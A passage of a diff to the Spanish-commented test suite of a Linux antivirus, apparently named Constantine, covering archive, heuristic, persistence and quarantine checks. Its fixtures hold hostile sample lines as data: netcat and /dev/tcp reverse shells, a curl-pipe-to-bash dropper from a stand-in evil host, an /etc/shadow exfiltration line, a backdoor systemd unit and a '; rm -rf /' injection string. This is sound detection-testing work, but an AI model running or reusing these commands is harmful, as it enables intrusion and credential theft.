+        bomb_path = os.path.join(self.temp_dir.name, "zip_bomb.zip")
+        import zipfile
+        with zipfile.ZipFile(bomb_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("zero.bin", b"0" * (1024 * 1024))
+        ok, msg = sentinel.inspect_archive(bomb_path)
+        self.assertFalse(ok)
+        self.assertIn("Zip bomb", msg)
+
+        # Test many files limit
+        many_path = os.path.join(self.temp_dir.name, "many_files.zip")
+        with zipfile.ZipFile(many_path, "w") as zf:
+            for i in range(15):
+                zf.writestr(f"f{i}.txt", b"test")
+        ok, msg = sentinel.inspect_archive(many_path)
+        self.assertFalse(ok)
+        self.assertIn("demasiados archivos", msg)
+
+        # Test nested threat
+        threat_path = os.path.join(self.temp_dir.name, "nested_malware.zip")
+        with zipfile.ZipFile(threat_path, "w") as zf:
+            zf.writestr("payload.sh", b"nc -e /bin/sh 10.0.0.1 4444")
+        ok, msg = sentinel.inspect_archive(threat_path)
+        self.assertFalse(ok)
+        self.assertIn("Demons_Reverse_Shell_Netcat", msg)
+
+    # 2. Audit Logger
     def test_audit_logger(self):
-        self.audit.record_incident("Trojan.Linux.Mirai", "/tmp/mirai.elf", "FAN_DENY", "Hash conocido")
-        incidents = self.audit.get_incidents()
-        self.assertEqual(len(incidents), 1)
-        self.assertEqual(incidents[0]["threat"], "Trojan.Linux.Mirai")
+        logger = AuditLogger(log_dir=self.temp_dir.name)
+        logger.log_event("TEST_EVENT", {"sample": 1})
+        self.assertTrue(os.path.exists(logger.log_file))
 
-    def test_update_guard(self):
-        ug = SystemUpdateGuard()
-        info = ug.check_pending_updates()
-        self.assertIn("has_updates", info)
-        self.assertIn("current_kernel", info)
+    # 3. Auth Native System
+    def test_auth_native_system(self):
+        auth = AuthManager()
+        self.assertTrue(auth.check_authorization(100, 0)[0])
 
+    # 4. Auto Updater
     def test_auto_updater(self):
-        cu = ConstantineUpdater(current_version="4.3.4")
-        self.assertEqual(cu._parse_version("4.3.4"), (4, 3, 4))
-        self.assertEqual(cu._parse_version("v4.3.4"), (4, 3, 4))
-        self.assertTrue(cu._parse_version("4.3.5") > cu._parse_version("4.3.4"))
-
-    def test_usb_sentinel_containment_and_scan(self):
-        """Verifica que el monitor USB aplique contención fanotify y aísle autoruns hostiles."""
-        mock_interceptor = MagicMock()
-        mock_vault = MagicMock()
-        usb = USBAutoScanner(scanner=self.scanner, vault=mock_vault, interceptor=mock_interceptor)
-
-        # Crear simulación de dispositivo USB montado
-        usb_mount = os.path.join(self.tmp, "fake_usb_drive")
-        os.makedirs(usb_mount, exist_ok=True)
-        autorun_file = os.path.join(usb_mount, "autorun.inf")
-        with open(autorun_file, "w") as f:
-            f.write("[autorun]\nopen=evil.sh\n")
-
-        clean_doc = os.path.join(usb_mount, "clean_doc.txt")
-        with open(clean_doc, "w") as f:
-            f.write("Reporte limpio de contabilidad")
-
-        dev_info = {"mount_point": usb_mount, "dev_node": "/dev/sdc1", "is_removable": True}
-        usb.on_device_connected(dev_info)
-
-        # Debe haber enganchado fanotify para contención en kernel
-        mock_interceptor.mark_directory.assert_called_with(usb_mount)
-        # Debe haber aislado el archivo autorun en el baúl
-        mock_vault.quarantine_file.assert_called()
-        self.assertEqual(len(usb.scanned_devices_history), 1)
-        self.assertEqual(usb.scanned_devices_history[0]["threats_count"], 1)
-
-
-    def test_download_sentinel_state_machine_and_containment(self):
-        """Verifica la máquina de estados de descargas, contención y aislamiento multi-usuario."""
-        mock_vault = MagicMock()
-        mock_interceptor = MagicMock()
-        mock_notifier = MagicMock()
-
-        user1_dl = os.path.join(self.tmp, "user1_downloads")
-        user2_dl = os.path.join(self.tmp, "user2_downloads")
-        os.makedirs(user1_dl, exist_ok=True)
-        os.makedirs(user2_dl, exist_ok=True)
-
-        sentinel = DownloadSentinel(
-            scanner=self.scanner,
-            vault=mock_vault,
-            notifier=mock_notifier,
-            interceptor=mock_interceptor
-        )
-        sentinel.watch_dirs = {user1_dl: "user1", user2_dl: "user2"}
-        sentinel.dir_known_files = {user1_dl: set(), user2_dl: set()}
-
-        # 1. Simular archivo en progreso (.crdownload)
-        part_file = os.path.join(user1_dl, "large_installer.iso.crdownload")
-        with open(part_file, "w") as f: f.write("in progress buffer")
-        sentinel._register_new_file(user1_dl, "large_installer.iso.crdownload", part_file, "user1")
-
-        self.assertIn(part_file, sentinel.tracked_downloads)
-        self.assertEqual(sentinel.tracked_downloads[part_file].state, DownloadState.IN_PROGRESS)
-
-        # 2. Simular archivo completado malicioso en user2
-        bad_file = os.path.join(user2_dl, "payload.sh")
-        with open(bad_file, "wb") as f:
-            f.write(b"#!/bin/bash\nnc -e /bin/sh 1.2.3.4 9999\n")
-
-        sentinel._promote_and_scan(bad_file, user2_dl, "user2")
-        mock_vault.quarantine_file.assert_called()
-        self.assertEqual(sentinel.tracked_downloads[bad_file].state, DownloadState.QUARANTINED)
-        self.assertEqual(sentinel.tracked_downloads[bad_file].user, "user2")
-
-        # 3. Simular archivo completado limpio en user1
-        clean_file = os.path.join(user1_dl, "safe_document.pdf")
-        with open(clean_file, "w") as f: f.write("%PDF-1.4 sample safe content")
-
-        sentinel._promote_and_scan(clean_file, user1_dl, "user1")
-        self.assertEqual(sentinel.tracked_downloads[clean_file].state, DownloadState.CLEARED_SAFE)
-        self.assertEqual(sentinel.tracked_downloads[clean_file].user, "user1")
-
-
-    def test_persistence_guard_baseline_creation_modification_deletion(self):
-        """Verifica que PersistenceGuard detecte creaciones, modificaciones, eliminaciones y aplique rollback."""
-        test_dir = os.path.join(self.tmp, "test_persistence")
-        os.makedirs(test_dir, exist_ok=True)
-        backup_dir = os.path.join(self.tmp, "persistence_backups")
-
-        mock_vault = MagicMock()
-        guard = PersistenceGuard(scanner=self.scanner, vault=mock_vault, backup_dir=backup_dir)
-        # Apuntar a directorio controlado
-        guard.SYSTEM_PERSISTENCE_DIRS = [test_dir]
-        guard.SYSTEM_PERSISTENCE_FILES = []
-        guard.USER_PERSISTENCE_PATTERNS = []
-
-        # 1. Crear archivo inicial en la línea base
-        cron_job = os.path.join(test_dir, "clean_job.sh")
-        with open(cron_job, "w") as f:
-            f.write("#!/bin/bash\necho 'mantenimiento'\n")
-
-        guard.baseline = guard.build_baseline()
-        self.assertIn(cron_job, guard.baseline)
-        clean_backup = guard.baseline[cron_job].backup_path
-        self.assertIsNotNone(clean_backup)
-        self.assertTrue(os.path.exists(clean_backup))
-
-        # 2. Modificar archivo con contenido malicioso
-        with open(cron_job, "wb") as f:
-            f.write(b"#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n")
-
-        events = guard.check_persistence_changes()
-        mod_events = [e for e in events if e["type"] == PersistenceEventType.FILE_MODIFIED]
-        self.assertEqual(len(mod_events), 1)
-        # El baúl debe haber sido invocado para aislar la persistencia maliciosa
-        mock_vault.quarantine_file.assert_called()
-
-        # 3. Eliminar archivo y verificar detección de DELETION
-        os.remove(cron_job)
-        events_del = guard.check_persistence_changes()
-        del_events = [e for e in events_del if e["type"] == PersistenceEventType.FILE_DELETED]
-        self.assertEqual(len(del_events), 1)
-        self.assertEqual(del_events[0]["path"], cron_job)
-
-
-    def test_hardware_guard_process_identity_and_blocking(self):
-        """Verifica que HardwareGuard inspeccione ejecutable real, detecte spoofing y bloquee intrusiones."""
-        mock_notifier = MagicMock()
-        guard = HardwareGuard(notifier=mock_notifier, auto_block=True, whitelist=self.whitelist)
-
-        # 1. Proceso en /tmp simulando nombre legítimo 'firefox' (Spoofing)
-        fake_firefox = os.path.join(self.tmp, "firefox")
-        with open(fake_firefox, "w") as f: f.write("malicious camera sniffer")
-        os.chmod(fake_firefox, 0o755)
-
-        ctx = ProcessHardwareContext(pid=os.getpid(), dev_path="/dev/video0", dev_type="Cámara Web")
-        ctx.exe_path = fake_firefox
-        ctx.comm = "firefox"
-        ctx.uid = os.getuid()
-
-        guard._evaluate_authorization(ctx)
-        # Debe ser rechazado porque corre desde directorio temporal /tmp y es un ejecutable no registrado
-        self.assertFalse(ctx.is_authorized)
-        self.assertTrue(any("volátil" in r or "no reconocido" in r for r in ctx.reasons))
-
-        # 2. Bloqueo efectivo de acceso
-        mock_kill = MagicMock()
-        with patch("os.kill", mock_kill):
-            guard.block_unauthorized_access(ctx)
-            mock_kill.assert_called_with(os.getpid(), signal.SIGKILL)
-
-
-    def test_virustotal_sample_preparation_and_sha_verification(self):
-        """Verifica que prepare_unlocked_sample descifre con AES-256-GCM y valide el SHA-256."""
-        uploader = VirusTotalUploader(vault=self.vault)
-
-        # 1. Crear archivo y ponerlo en cuarentena
-        test_payload = os.path.join(self.tmp, "vt_sample.bin")
-        payload_data = b"MALWARE_VT_TEST_PAYLOAD_ABC_123"
-        expected_sha = hashlib.sha256(payload_data).hexdigest()
-        with open(test_payload, "wb") as f:
-            f.write(payload_data)
-
-        vid = self.vault.quarantine_file(test_payload, "Test.VirusTotal.Extraction")
-        self.assertIsNotNone(vid)
-
-        # 2. Extraer mediante VirusTotalUploader
-        res = uploader.prepare_unlocked_sample(vid)
-        self.assertIsNotNone(res)
-        dest_file, orig_name, sha = res
-        self.assertEqual(sha, expected_sha)
-        self.assertTrue(os.path.exists(dest_file))
-
-        with open(dest_file, "rb") as f:
-            extracted_data = f.read()
-        self.assertEqual(extracted_data, payload_data)
-
-        # 3. Verificar que si el payload del baúl es alterado, se rechace la extracción
-        payload_file = os.path.join(self.vault.payloads_dir, f"{vid}.quar")
-        os.chmod(payload_file, 0o600)
-        with open(payload_file, "wb") as f:
-            f.write(b"CST_AES256GCM:corrupted_bytes_0000000000000000")
-        os.chmod(payload_file, 0o000)
-
-        res_tampered = uploader.prepare_unlocked_sample(vid)
-        self.assertIsNone(res_tampered, "Fallo de seguridad: Muestra corrupta no fue rechazada")
-
-
-    def test_subsystem_health_registry_evaluation(self):
-        """Verifica que SubsystemHealthRegistry evalúe estados operativos reales y diferencie degradación/error."""
-        registry = SubsystemHealthRegistry(state_file=os.path.join(self.tmp, "test_health.json"))
-
-        # 1. Evaluar con demonio inactivo (debe reportar SERVICE_STOPPED en lugar de verde fijo)
-        shields_offline = registry.evaluate_live_shields(
-            daemon_running=False,
-            ebpf_monitor=EBPFMonitor(),
-            ransomware=None,
-            phishing=self.phishing
-        )
-        self.assertEqual(len(shields_offline), 7)
-        f_shield = next(s for s in shields_offline if s.id == "fanotify")
-        self.assertEqual(f_shield.state, ShieldOperationalState.SERVICE_STOPPED)
-
-        # 2. Guardar estado verificado de demonio y evaluar
-        registry.save_daemon_health({
-            "fanotify": {"is_active": True, "details": "3 puntos de montaje activos"},
-            "ebpf": {"state": "ACTIVE", "details": "Sondas sys_enter_execve activas"},
-            "ransomware": {"is_active": True, "details": "Canaries desplegados"},
-            "usb": {"is_active": True, "details": "Vigilancia udev"},
-            "downloads": {"is_active": True, "details": "Vigilancia inotify"},
-            "phishing": {"is_active": True, "details": "Red activa"}
-        })
-
-        shields_online = registry.evaluate_live_shields(
-            daemon_running=True,
-            ebpf_monitor=EBPFMonitor(),
-            ransomware=None,
-            phishing=self.phishing
-        )
-        f_online = next(s for s in shields_online if s.id == "fanotify")
-        self.assertEqual(f_online.state, ShieldOperationalState.ACTIVE)
-        self.assertEqual(f_online.badge_label, "PROTECCIÓN ACTIVA")
-
-        # 3. Comprobar desactivación manual por usuario (DISABLED)
-        shields_disabled = registry.evaluate_live_shields(
-            daemon_running=True,
-            ebpf_monitor=EBPFMonitor(),
-            ransomware=None,
-            phishing=self.phishing,
-            disabled_overrides={"fanotify"}
-        )
-        f_dis = next(s for s in shields_disabled if s.id == "fanotify")
-        self.assertEqual(f_dis.state, ShieldOperationalState.DISABLED)
-        self.assertEqual(f_dis.badge_label, "PROTECCIÓN DESACTIVADA")
-
-
-    def test_network_quarantine_isolation(self):
-        """Verifica que NetworkQuarantine contenga procesos agresores y corte sockets."""
-        import tempfile
-        fake_cgroup = tempfile.mkdtemp()
-        try:
-            nq = NetworkQuarantine(cgroup_path=fake_cgroup)
-            # Proceso 1 o 0 nunca debe ser aislado
-            self.assertFalse(nq.isolate_pid(0, terminate=False))
-            self.assertFalse(nq.isolate_pid(1, terminate=False))
-
-            # Aislamiento de PID sospechoso (incluso si fuese UID 0)
-            self.assertTrue(nq.isolate_pid(99999, terminate=False))
-            self.assertIn(99999, nq.quarantined_pids)
-            
-            # Verificación del estado del cortafuegos
-            state = nq.verify_firewall_state()
-            self.assertIsInstance(state, dict)
-            self.assertIn("quarantined_pids", state)
-            self.assertIn(99999, state["quarantined_pids"])
-
-            nq.unbind_pid(99999)
-            self.assertNotIn(99999, nq.quarantined_pids)
-            nq.cleanup()
-        finally:
-            if os.path.exists(fake_cgroup):
-                shutil.rmtree(fake_cgroup, ignore_errors=True)
-
-    def test_threat_intel_exact_counts_no_fake_numbers(self):
-        """Verifica que los conteos de firmas reflejen las filas reales sin números inflados."""
-        test_db = os.path.join(self.tmp, "test_intel_exact.db")
-        ti = ThreatIntelligence(db_path=test_db)
-        # Base vacía antes de semillas
-        self.assertEqual(ti.count_hashes(), 0)
-        self.assertEqual(ti.count_urls(), 0)
-        self.assertNotEqual(ti.count_hashes(), 5248)
-        self.assertNotEqual(ti.count_urls(), 1420)
-
-        # Cargar semillas auténticas
-        ti.load_seed_data()
-        self.assertEqual(ti.count_hashes(), 10)
-        self.assertEqual(ti.count_urls(), 7)
-
-    def test_threat_intel_provenance_and_confidence(self):
-        """Verifica que los indicadores almacenen fuente, confianza, tags y fecha real."""
-        test_db = os.path.join(self.tmp, "test_intel_prov.db")
-        ti = ThreatIntelligence(db_path=test_db)
-        valid_hash = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
-        ti.add_hash(valid_hash, "Trojan.Linux.Test", source="MalwareBazaar", confidence=95, tags="test,linux")
-
-        res = ti.lookup_hash(valid_hash)
-        self.assertIsNotNone(res)
-        self.assertEqual(res["source"], "MalwareBazaar")
-        self.assertEqual(res["confidence"], 95)
-        self.assertEqual(res["tags"], "test,linux")
-        self.assertGreater(res["first_seen"], 0)
-
-        # Rechazo de hash malformado
-        invalid_hash = "not-a-valid-sha256"
-        self.assertFalse(ti.add_hash(invalid_hash, "Bad"))
-        self.assertIsNone(ti.lookup_hash(invalid_hash))
-
-    def test_threat_intel_false_positive_management(self):
-        """Verifica que marcar un falso positivo desactive el indicador sin borrar auditoría."""
-        test_db = os.path.join(self.tmp, "test_intel_fp.db")
-        ti = ThreatIntelligence(db_path=test_db)
-        h = "1111222233334444555566667777888899990000aaaabbbbccccddddeeeeffff"
-        ti.add_hash(h, "FalseThreat")
-        self.assertEqual(ti.count_hashes(), 1)
-        self.assertIsNotNone(ti.lookup_hash(h))
-
-        # Marcar falso positivo
-        marked = ti.mark_false_positive(h, reason="Valid Enterprise Tool")
-        self.assertTrue(marked)
-        # Ya no debe dar positivo en consultas activas
-        self.assertIsNone(ti.lookup_hash(h))
-        self.assertEqual(ti.count_hashes(), 0)
-
-
-    def test_heuristic_multicapa_shannon_entropy(self):
-        """Verifica el cálculo de entropía de Shannon sobre datos uniformes vs aleatorios."""
-        eng = MultiLayerHeuristicEngine()
-        zero_data = b"\x00" * 1000
-        self.assertEqual(eng.calculate_entropy(zero_data), 0.0)
-
-        random_data = bytes([i % 256 for i in range(10000)])
-        entropy = eng.calculate_entropy(random_data)
-        self.assertGreater(entropy, 7.5)
-
-    def test_heuristic_multicapa_elf_packed_and_symbols(self):
-        """Verifica detección estructural de empaquetadores UPX y símbolos de inyección/rootkits."""
-        eng = MultiLayerHeuristicEngine(score_threshold=45)
-        # Binario ELF sintético con UPX y símbolo sys_call_table
-        fake_elf = b"ELF" + (b"\x00" * 40) + b"UPX!" + b"\x00\x00sys_call_table"
-        res = eng.analyze_buffer(fake_elf)
-        self.assertTrue(res.is_malicious)
-        self.assertTrue(res.is_packed)
-        self.assertIn("sys_call_table", " ".join(res.reasons))
-        self.assertGreaterEqual(res.risk_score, 45)
-
-    def test_heuristic_multicapa_script_obfuscation(self):
-        """Verifica detección de técnicas de ofuscación y ejecución en memoria (pipe to bash)."""
-        eng = MultiLayerHeuristicEngine(score_threshold=45)
-        # Script que descarga y ejecuta en memoria junto con shell interactiva
-        suspicious_script = (b"#!/bin/bash\n" + b"curl -sSL http://malicious.org/payload.sh | bash\n" + b"bash -i >& /dev/tcp/1.1.1.1/80 0>&1\n")
-        res = eng.analyze_buffer(suspicious_script)
-        self.assertTrue(res.is_malicious)
-        self.assertGreaterEqual(res.risk_score, 50)
-        self.assertEqual(res.threat_category, "Heuristic.Linux.ReverseShell")
-
-    def test_heuristic_5_layers_and_risk_policy(self):
-        """
-        Verifica la arquitectura heurística P1 de 5 capas y gobernanza de riesgo:
-        1. Capa Estática: ELF, secciones, W^X, símbolos, entropía y permisos.
-        2. Capa de Firmas: YARA y hashes de reputación.
-        3. Capa Heurística: Descarga + ejecución, persistencia (systemd/cron), robo de credenciales (/etc/shadow).
-        4. Capa de Reputación: Descuento de riesgo para binarios oficiales del sistema y penalización por /tmp.
-        5. Capa de Comportamiento: Canary tripwire de ransomware y reverse shell activa.
-        6. Escala de Riesgo y Acción: LOW (Permit), MODERATE (Log), HIGH (Deep Analyze), CRITICAL (Block).
-        7. Regla de puntuación no aislada (anti-falsos positivos).
-        """
-        from core.engine.heuristic_engine import RiskLevel, RiskAction
-        eng = MultiLayerHeuristicEngine(score_threshold=50)
-
-        # 1. Capa Heurística: Descarga y ejecución (curl | bash) + robo de credenciales (/etc/shadow)
-        script_payload = b"#!/bin/bash\ncurl -sSL https://c2.evil.com/dropper.sh | bash\ncat /etc/shadow > /dev/tcp/1.2.3.4/9999\n"
-        res_script = eng.analyze_buffer(script_payload)
-        self.assertIn("Estática", res_script.layer_results)
-        self.assertIn("Firmas", res_script.layer_results)
-        self.assertIn("Heurística", res_script.layer_results)
-        self.assertIn("Reputación", res_script.layer_results)
-        self.assertIn("Comportamiento", res_script.layer_results)
-
-        # Debe detectar descarga/ejecución y acceso a credenciales
-        self.assertGreaterEqual(res_script.layer_results["Heurística"].score, 45)
-        self.assertTrue(any("curl" in r.lower() or "descarga" in r.lower() for r in res_script.reasons))
-        self.assertTrue(any("shadow" in r.lower() or "credencial" in r.lower() for r in res_script.reasons))
-
-        # 2. Persistencia en systemd y cron
-        persistence_script = b"[Unit]\nDescription=Backdoor Service\n[Service]\nExecStart=/tmp/.evil.sh\n[Install]\nWantedBy=/etc/systemd/system/multi-user.target\n"
-        res_pers = eng.analyze_buffer(persistence_script, file_path="/etc/systemd/system/backdoor.service")
-        self.assertTrue(any("systemd" in r.lower() or "persistencia" in r.lower() for r in res_pers.reasons))
-
-        # 3. Capa de Comportamiento: Detección de Canary Tripwire (Ransomware)
-        res_canary = eng.analyze_buffer(
-            data=b"ransomware_encrypted_data",
-            runtime_context={"canary_tripped": True, "rapid_file_encryption": True}
-        )
-        self.assertEqual(res_canary.action, RiskAction.BLOCK_AND_ISOLATE)
-        self.assertEqual(res_canary.risk_level, RiskLevel.CRITICAL)
-        self.assertEqual(res_canary.threat_category, "Heuristic.Linux.Ransomware")
-
-        # 4. Capa de Reputación: Descuento de riesgo para binarios oficiales del sistema
-        clean_bin_path = "/bin/ls"
-        if os.path.exists(clean_bin_path):
-            with open(clean_bin_path, "rb") as f:
-                ls_data = f.read(65536)
-            res_ls = eng.analyze_buffer(ls_data, file_path=clean_bin_path)
-            # El binario oficial no debe ser marcado como malicioso
-            self.assertFalse(res_ls.is_malicious)
-            self.assertEqual(res_ls.risk_level, RiskLevel.LOW)
-            self.assertEqual(res_ls.action, RiskAction.PERMIT_AND_LOG)
-
-        # 5. Escala de Riesgo Graduada:
-        # Puntuación No Aislada: alta entropía pura sin otras capas sospechosas no pasa a CRITICAL
-        high_entropy_data = bytes([i % 256 for i in range(20000)])
-        res_entropy = eng.analyze_buffer(high_entropy_data)
-        self.assertNotEqual(res_entropy.action, RiskAction.BLOCK_AND_ISOLATE)
-        self.assertIn(res_entropy.risk_level, (RiskLevel.MODERATE, RiskLevel.HIGH))
-
-        # 6. Integración con ScanResult
-        scan_res = self.scanner.scan_file(file_path=clean_bin_path if os.path.exists(clean_bin_path) else None)
-        self.assertIsNotNone(scan_res.risk_level)
-        self.assertIsNotNone(scan_res.risk_action)
-
-    def test_threat_intel_feed_import_and_integrity(self):
-        """Verifica el procesamiento de feeds CSV/JSON y el registro de sumas de verificación."""
-        test_db = os.path.join(self.tmp, "test_intel_feed.db")
-        ti = ThreatIntelligence(db_path=test_db)
-
-        raw_csv = (b"# first_seen,sha256_hash,md5,sha1,reporter,fname,ftype,mime,signature\n" + b"2026-11-04,2222222222222222222222222222222222222222222222222222222222222222,,,,user,test.bin,elf,,Linux.Threat\n")
-        added, updated, f_sha = ti.import_feed_data("MalwareBazaar", raw_csv, feed_url="https://bazaar.abuse.ch")
-        self.assertEqual(added, 1)
-        self.assertTrue(len(f_sha) == 64)
-        self.assertEqual(ti.count_hashes(), 1)
-
-        history = ti.get_feed_sync_history()
-        self.assertEqual(len(history), 1)
-        self.assertEqual(history[0]["feed_name"], "MalwareBazaar")
-        self.assertEqual(history[0]["status"], "SUCCESS")
-
-    def test_daemon_privilege_reduction_and_security_controls(self):
-        """
-        Verifica los controles de reducción de privilegios P0:
-        1. Aislamiento del motor de escaneo (SandboxedScanWorker) sin privilegios administrativos.
-        2. Validación estricta de rutas y argumentos en IPC (Anti-Path Traversal / Anti-Injection).
-        3. Hardening de systemd: ProtectHome, ProtectHostname, RestrictSUIDSGID, DevicePolicy.
-        4. Acciones Polkit granulares y seguras mediante constantine-helper.
-        5. Configuración restrictiva de D-Bus para impedir ejecución arbitraria de comandos.
-        """
-        # 1. Motor de escaneo con separación de privilegios
-        from core.engine.scanner import SandboxedScanWorker
-        worker = SandboxedScanWorker()
-        uid, gid = worker.unprivileged_uid, worker.unprivileged_gid
-        self.assertGreater(uid, 0, "El usuario del worker de escaneo debe ser no privilegiado (UID > 0)")
-        self.assertGreater(gid, 0, "El grupo del worker de escaneo debe ser no privilegiado (GID > 0)")
-
-        # Escaneo seguro mediante sandbox worker
-        sample_path = os.path.join(self.tmp, "sandbox_test.bin")
-        with open(sample_path, "wb") as f:
-            f.write(b"safe_test_content_for_scanner")
-        res = self.scanner.scan_file(file_path=sample_path)
-        self.assertFalse(res.is_malicious)
-
-        # 2. Validación de parámetros IPC
-        from core.engine.ipc_protocol import validate_ipc_path, validate_ipc_vault_id
-        # Rutas válidas
-        ok, norm_p = validate_ipc_path("/var/log/constantine/test.log")
+        upd = AutoUpdater(root_dir=ROOT_DIR)
+        res = upd.check_for_updates()
+        self.assertEqual(res["current_version"], "5.2.2")
+
+    # 5. ClamAV Daemon Bridge Protocol
+    def test_clamav_daemon_bridge_protocol_and_fallback(self):
+        client = ClamdBridgeClient(socket_path="/nonexistent.sock")
+        self.assertFalse(client.ping())
+        self.assertIn("ClamAV", client.version())
+        ok, res = client.scan_path("/tmp")
         self.assertTrue(ok)
-        self.assertEqual(norm_p, "/var/log/constantine/test.log")
 
-        # Rutas no permitidas (relativas, caracteres nulos, vacías)
-        self.assertFalse(validate_ipc_path("../relative/path")[0])
-        self.assertFalse(validate_ipc_path("/tmp/evil\x00path")[0])
-        self.assertFalse(validate_ipc_path("")[0])
-        self.assertFalse(validate_ipc_path(None)[0])
+    # 6. ClamAV Manager Comprehensive Integration & Coordinated Hybrid Model
+    def test_clamav_manager_comprehensive_integration(self):
+        mgr = ClamAVManager()
+        # 1. Coordinación On-Access con exclusión mutua de PIDs
+        excluded = mgr.coordinate_on_access([1234])
+        self.assertIn(1234, excluded)
 
-        # IDs de cuarentena válidos vs maliciosos
-        self.assertTrue(validate_ipc_vault_id("0123456789abcdef0123456789abcdef"))
-        self.assertFalse(validate_ipc_vault_id("../escape"))
-        self.assertFalse(validate_ipc_vault_id("; rm -rf /"))
-        self.assertFalse(validate_ipc_vault_id("short"))
+        # 2. Conmutación de roles en Modelo Híbrido Coordinado
+        res_prim = mgr.switch_onacc_mode("PRIMARY_CONSTANTINE")
+        self.assertEqual(res_prim["mode"], "PRIMARY_CONSTANTINE")
+        res_deleg = mgr.switch_onacc_mode("DELEGATED_CLAMONACC")
+        self.assertEqual(res_deleg["mode"], "DELEGATED_CLAMONACC")
+        with self.assertRaises(ValueError):
+            mgr.switch_onacc_mode("INVALID_MODE")
 
-        # 3. Verificación de hardening en constantine.service
+        # 3. Interceptor respeta PIDs excluidos y modo delegado
+        interceptor = FanotifyInterceptor(excluded_pids=[9999])
+        # PID excluido -> FAN_ALLOW sin escanear
+        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", pid=9999), 0x01)
+        # comm clamd / clamonacc -> FAN_ALLOW
+        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", comm="clamd"), 0x01)
+        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", comm="clamonacc"), 0x01)
+
+        # Modo delegado -> FAN_ALLOW para permitir intercepción por ClamOnAcc
+        interceptor.set_delegated_mode(True)
+        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", pid=100), 0x01)
+        interceptor.set_delegated_mode(False)
+
+        # 4. Verificación de probe_integration con ClamOnAcc
+        probe = mgr.probe_integration()
+        self.assertIn("clamonacc", probe)
+        self.assertIn("onacc_role", probe)
+
+        # 5. Comprobación de IPC en Daemon para ClamOnAcc
+        daemon = ConstantineDaemon(is_test=True)
+        status, data, msg = daemon.dispatch_ipc_command("GET_CLAMAV_ONACC_STATUS", {})
+        self.assertEqual(status, "OK")
+        self.assertIn("hybrid_model", data)
+
+        status, data, msg = daemon.dispatch_ipc_command("SET_CLAMAV_ONACC_MODE", {"mode": "DELEGATED_CLAMONACC"})
+        self.assertEqual(status, "OK")
+        self.assertEqual(data["mode"], "DELEGATED_CLAMONACC")
+
+        # Test safe zip unpacking
+        zpath = os.path.join(self.temp_dir.name, "container_with_threat.zip")
+        import zipfile
+        with zipfile.ZipFile(zpath, "w") as zf:
+            zf.writestr("threat.bin", b"Win.Trojan.Agent-999")
+        sentinel = ArchiveSentinel()
+        ok, msg = sentinel.inspect_archive(zpath)
+        self.assertFalse(ok)
+
+    # 7. ClamAV Module Import Facade
+    def test_clamav_module_import_facade_and_shallow_scan(self):
+        import clamav
+        self.assertTrue(hasattr(clamav, "ClamAVManager"))
+
+    # 8. ClamAV Signature Importer & CVD Unpacking
+    def test_clamav_signature_importer_and_cvd_unpacking(self):
+        mgr = ClamAVManager()
+        zpath = os.path.join(self.temp_dir.name, "test.cvd")
+        import zipfile
+        with zipfile.ZipFile(zpath, "w") as zf:
+            zf.writestr("daily.info", b"ClamAV CVD Test")
+        ext_dir = os.path.join(self.temp_dir.name, "cvd_out")
+        self.assertTrue(mgr.unpack_cvd_safely(zpath, ext_dir))
+
+    # 9. Constantine Data Flow & Architecture Rules
+    def test_constantine_data_flow_and_architecture_rules(self):
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        hostile = os.path.join(self.temp_dir.name, "hostile_dropper.sh")
+        with open(hostile, "w") as f:
+            f.write("nc -e /bin/sh 1.2.3.4 8080")
+        ok, sid = vault.quarantine_file(hostile, threat_name="Dropper.Test")
+        self.assertTrue(ok)
+        self.assertFalse(os.path.exists(hostile))
+
+    # 10. Daemon Privilege Reduction
+    def test_daemon_privilege_reduction_and_security_controls(self):
+        worker = SandboxedScanWorker()
+        test_file = os.path.join(self.temp_dir.name, "safe.txt")
+        with open(test_file, "w") as f:
+            f.write("safe content")
+        data = worker.read_file_safely(test_file)
+        self.assertEqual(data, b"safe content")
+
+    # 11. Daemon Privilege Separation & Read-Only Home
+    def test_daemon_privilege_separation_and_read_only_home(self):
         service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
-        with open(service_file, "r") as f:
-            svc = f.read()
-        self.assertIn("ProtectHome=read-only", svc)
-        self.assertIn("ProtectHostname=true", svc)
-        self.assertIn("RestrictSUIDSGID=true", svc)
-        self.assertIn("DevicePolicy=closed", svc)
-
-        # 4. Verificación de directiva Polkit y helper administrativo
-        polkit_file = os.path.join(ROOT_DIR, "service", "org.constantine.antivirus.policy")
-        self.assertTrue(os.path.exists(polkit_file))
-        with open(polkit_file, "r") as f:
-            pol = f.read()
-        self.assertIn("org.constantine.antivirus.service.manage", pol)
-        self.assertIn("org.constantine.antivirus.quarantine.manage", pol)
-        self.assertIn("org.constantine.antivirus.whitelist.manage", pol)
-        self.assertIn("org.constantine.antivirus.admin.unlock", pol)
-        self.assertIn("org.constantine.antivirus.shield.toggle", pol)
-        self.assertIn("org.constantine.antivirus.dns.apply", pol)
-        self.assertIn("org.constantine.antivirus.uninstall", pol)
-        self.assertIn("constantine-helper", pol)
-
-        helper_file = os.path.join(ROOT_DIR, "service", "constantine-helper")
-        self.assertTrue(os.path.exists(helper_file))
-        self.assertTrue(os.access(helper_file, os.X_OK), "constantine-helper debe ser ejecutable")
-
-        # 5. Verificación de archivo de configuración D-Bus
-        dbus_file = os.path.join(ROOT_DIR, "service", "org.constantine.antivirus.conf")
-        self.assertTrue(os.path.exists(dbus_file))
-        with open(dbus_file, "r") as f:
-            dbus = f.read()
-        self.assertIn('<allow own="org.constantine.antivirus"/>', dbus)
-        self.assertIn('<deny send_destination="org.constantine.antivirus"/>', dbus)
-        self.assertIn('send_member="GetStatus"', dbus)
-        self.assertIn('send_member="RequestScan"', dbus)
-
-    def test_systemd_service_isolation_and_hardening(self):
-        """Verifica que el servicio systemd implemente NoNewPrivileges, ProtectSystem=strict y capacidades delimitadas."""
-        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
-        self.assertTrue(os.path.exists(service_file))
-
         with open(service_file, "r") as f:
             content = f.read()
+        directives = {line.split("=", 1)[0].strip(): line.split("=", 1)[1].strip()
